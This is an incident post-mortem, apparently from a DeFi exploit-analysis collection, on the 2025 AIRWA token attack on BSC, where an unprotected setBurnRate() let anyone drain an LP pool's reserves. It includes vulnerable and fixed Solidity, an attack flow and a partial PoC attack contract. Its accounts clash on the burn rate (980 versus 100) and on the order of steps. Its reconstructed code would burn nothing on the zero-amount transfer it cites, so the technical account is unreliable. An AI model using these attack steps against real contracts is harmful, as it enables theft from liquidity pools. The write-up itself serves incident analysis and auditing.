# AIRWA — Price Manipulation via Unauthorized Burn Rate Modification

| Field | Details |
|------|------|
| **Date** | 2025-04-04 |
| **Protocol** | AIRWA Token |
| **Chain** | BSC |
| **Loss** | ~56.73 BNB |
| **Attacker** | [0x70f0406e0a50c53304194b2668ec853d664a3d9c](https://bscscan.com/address/0x70f0406e0a50c53304194b2668ec853d664a3d9c) |
| **Attack Tx** | [0x5cf050cb...](https://bscscan.com/tx/0x5cf050cba486ec48100d5e5ad716380660e8c984d80f73ba888415bb540851a4) |
| **Vulnerable Contract** | [0x3af7da38c9f68df9549ce1980eef4ac6b635223a](https://bscscan.com/address/0x3af7da38c9f68df9549ce1980eef4ac6b635223a) |
| **Root Cause** | No access control on `setBurnRate()`, allowing anyone to set the burn rate to 100% |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-04/AIRWA_exp.sol) |

---

## 1. Vulnerability Overview

The `setBurnRate()` function in the AIRWA token contract lacked access control, allowing anyone to call it. The attacker exploited this by setting the burn rate to 100%, then trading AIRWA tokens through the LP pool — causing all transferred tokens to be burned, sharply reducing the LP pool's reserve, and driving up the token price for remaining holders.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable setBurnRate: no access control
contract AIRWAToken {
    uint256 public burnRate;  // Burn rate (%)

    function setBurnRate(uint256 _burnRate) external {
        // ❌ No onlyOwner or other access control
        burnRate = _burnRate; // Anyone can modify arbitrarily
    }

    function _transfer(address from, address to, uint256 amount) internal override {
        uint256 burnAmount = amount * burnRate / 100;
        if (burnAmount > 0) {
            _burn(from, burnAmount); // Burn on transfer
        }
        super._transfer(from, to, amount - burnAmount);
    }
}

// ✅ Correct code
contract AIRWAToken {
    function setBurnRate(uint256 _burnRate) external onlyOwner { // ✅ Access control
        require(_burnRate <= MAX_BURN_RATE, "Burn rate too high"); // ✅ Upper bound
        burnRate = _burnRate;
    }
}
```

### On-Chain Original Code

> ⚠️ Contract not verified on Sourcify or Etherscan — source unavailable; reconstructed from PoC.

The AIRWA token (0x3Af7DA38C9F68dF9549Ce1980eEf4AC6B635223A, BSC) is not verified on Sourcify (chainid 56) or Etherscan V2 (SourceCode field is empty). The following is reconstructed from the DeFiHackLabs PoC (`AIRWA_exp.sol`), which shows the exact attack sequence:

```solidity
// RECONSTRUCTED — not verified source
// AIRWA token contract — setBurnRate() with no access control

interface IAIRWA is IERC20 {
    function setBurnRate(uint256 _burnRate) external; // ❌ no access control — callable by anyone
    function transfer(address to, uint256 amount) external returns (bool);
}

// Attack sequence from AIRWA_exp.sol (verbatim interface calls):
// 1. Swap 0.1 BNB → AIRWA via PancakeSwap (wBNB → BSC-USD → AIRWA path)
// 2. IAIRWA(AIRWA).setBurnRate(980); // ❌ set burn rate to 980 (effectively 100%+)
// 3. IAIRWA(AIRWA).transfer(CAKE_LP, 0); // triggers _transfer with 980% burn against LP reserves
// 4. IAIRWA(AIRWA).setBurnRate(0); // reset burn rate
// 5. Swap AIRWA → BNB to realize profit

// Reconstructed _transfer logic (based on PoC behavior):
contract AIRWAToken {
    uint256 public burnRate; // ❌ no cap, no validation

    function setBurnRate(uint256 _burnRate) external { // ❌ missing onlyOwner modifier
        burnRate = _burnRate;
    }

    function _transfer(address from, address to, uint256 amount) internal override {
        uint256 burnAmount = amount * burnRate / 100;
        if (burnAmount > 0 && to == CAKE_LP) {
            _burn(from, burnAmount); // ❌ burns from sender on LP transfers
        }
        super._transfer(from, to, amount - burnAmount); // ❌ reduced amount arrives at LP
    }
}
```

**Why it is exploitable (identify the bug from the code):**
- `setBurnRate()` has no `onlyOwner` or any other access control — any address can call it and set any value.
- By setting `burnRate = 980`, the attacker causes 980% (effectively all) of any transfer to the Cake LP to be burned from the sender's balance and/or the LP pool's reserves.
- A `transfer(CAKE_LP, 0)` call with a 980% burn rate drains the LP pool's AIRWA reserve, spiking the AIRWA spot price.
- The attacker then swaps their pre-purchased AIRWA back to BNB at the artificially elevated price, profiting ~56.73 BNB.

```solidity
// ✅ Fix: add onlyOwner and a maximum cap to setBurnRate()
function setBurnRate(uint256 _burnRate) external onlyOwner { // ✅ only owner can change
    require(_burnRate <= 10, "Burn rate too high"); // ✅ cap at 10% maximum
    burnRate = _burnRate;
    emit BurnRateChanged(_burnRate);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► Call AIRWA.setBurnRate(100)
  │         └─► ❌ No access control → burn rate set to 100%
  │
  ├─[2]─► Buy small amount of AIRWA tokens (BNB → AIRWA)
  │         └─► Transfer on purchase → 100% burned → LP pool reserve decreases
  │
  ├─[3]─► AIRWA price spikes due to reduced LP pool reserve
  │
  ├─[4]─► Sell pre-held AIRWA for BNB
  │         └─► (Attacker had acquired AIRWA before calling setBurnRate)
  │
  ├─[5]─► Or reverse: re-buy BNB at low reserve after attack
  │
  └─[6]─► Net profit: ~56.73 BNB
```

## 4. PoC Code (Core Logic with Comments)

```solidity
contract AttackContract {
    function attack() public {
        // [1] Set burn rate to 100% (no access control)
        IAIRWA(AIRWA).setBurnRate(100); // ❌ Callable by anyone

        // [2] Swap wBNB for AIRWA
        // The 100% burn on transfer reduces the LP pool's AIRWA reserve
        IERC20(wBNB).approve(PANCAKE_ROUTER, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = wBNB;
        path[1] = AIRWA;
        IPancakeRouter(PANCAKE_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            BNB_AMOUNT,
            0,
            path,
            address(this),
            block.timestamp
        );

        // [3] With AIRWA reserve depleted and price spiked,
        // realize profit via reverse BNB/AIRWA trade
        // (or sell pre-held AIRWA for BNB)

        // [4] Collect profit
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Missing Access Control |
| **Attack Technique** | Burn mechanism manipulation + AMM price manipulation |
| **DASP Category** | Access Control |
| **CWE** | CWE-284: Improper Access Control |
| **Severity** | High |
| **Attack Complexity** | Low |

## 6. Remediation Recommendations

1. **Add access control**: Add an `onlyOwner` or `onlyGovernance` modifier to `setBurnRate()`.
2. **Burn rate cap**: Set a maximum allowable burn rate to prevent extreme values.
3. **Timelock**: Apply a timelock to burn rate changes to prevent sudden modifications.
4. **Event emission**: Emit an event on burn rate changes to enable monitoring.

## 7. Lessons Learned

- **Audit all setter functions**: Every setter function in a token contract must have access control.
- **Burn mechanism impact on AMMs**: High burn rates directly affect AMM pool pricing and must be considered in protocol economic design.
- **Small vulnerability, large impact**: A single missing access control line led to a loss of 56 BNB.